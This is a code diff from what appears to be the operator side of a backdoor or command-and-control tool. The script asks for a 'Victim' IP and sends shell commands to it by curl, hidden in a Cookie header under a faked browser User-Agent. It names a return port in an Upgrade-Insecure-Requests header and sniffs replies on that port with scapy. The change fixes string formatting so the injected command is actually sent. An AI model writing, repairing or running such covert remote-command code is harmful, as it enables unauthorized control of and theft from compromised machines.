@@ -23,8 +23,9 @@ def start_sniffing():
     sniff(iface=get_IF_NAME(), filter=f"tcp port {RETURN_PORT}", prn=process_packet, store=0)
 
 def send_command(vic_ip, cmd):
-    print(fr"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: ${cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
-    system(fr"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: ${cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
+    print(vic_ip, cmd)
+    # print(f"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: {cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
+    system(f"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: {cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
 
 def main():
     vic_ip = input("Victim: ")
